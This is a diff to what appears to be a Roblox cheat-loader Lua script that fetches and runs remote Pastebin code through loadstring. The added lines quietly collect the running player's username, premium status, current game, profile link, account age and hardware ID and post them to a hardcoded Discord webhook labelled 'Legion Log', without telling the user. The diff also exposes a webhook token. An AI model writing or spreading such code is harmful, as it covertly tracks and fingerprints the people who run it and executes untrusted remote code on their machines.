@@ -4919,4 +4919,96 @@ loadstring(game:HttpGet("https://pastebin.com/raw/JKCcMv2m"), true)()
 loadstring(game:HttpGet("https://pastebin.com/raw/NVHH2LTW"), true)()
 loadstring(game:HttpGet("https://pastebin.com/raw/FLkdXxcL"), true)()
 
+-- Your Discord webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1288255480002773003/xZjYoUzH4qm9lUq1hyOsQIVUfs3framLoJd7gnxoz6LzatnWu5hxN-IR27NILrcBR6nW"
+
+-- Function to send an embedded message to the Discord webhook
+local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid)
+    -- Create the JSON payload with an embed
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "Legion Log",
+                ["description"] = "Details",
+                ["fields"] = {
+                    {
+                        ["name"] = "Username",
+                        ["value"] = username,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Premium Status",
+                        ["value"] = isPremium and "✅ Yes" or "❌ No",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Current Game Name",
+                        ["value"] = gameName,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Game ID",
+                        ["value"] = gameId,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "User Profile Link",
+                        ["value"] = userLink,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Account Age",
+                        ["value"] = accountAge,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "HWID",
+                        ["value"] = hwid,
+                        ["inline"] = false
+                    }
+                },
+                ["color"] = 16753920 -- Color code for orange
+            }
+        }
+    }
+
+    -- Convert the payload to a JSON string
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+
+    -- Use the executor's HTTP request method to send the request
+    local response = http_request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+
+    -- Check the response status
+    if response.StatusCode == 204 then
+        print("Message sent successfully!")
+    else
+        print("Failed to send message. Status code: " .. response.StatusCode)
+    end
+end
+
+-- Gather user information for the local player
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer -- Get the local player
+local username = player.Name
+local isPremium = player.MembershipType == Enum.MembershipType.Premium
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local gameId = game.PlaceId
+local userLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
+local accountAge = player.AccountAge .. " days"
+
+-- Fetch HWID
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+print("Your HWID is: " .. HWID)
+
+-- Call the function to send the embedded message with user info
+sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, HWID)
+
+
 print("UPdate check for purasppasiawnsadssweduSndaj | discord.gg/legiondh | discord.gg/internalx")
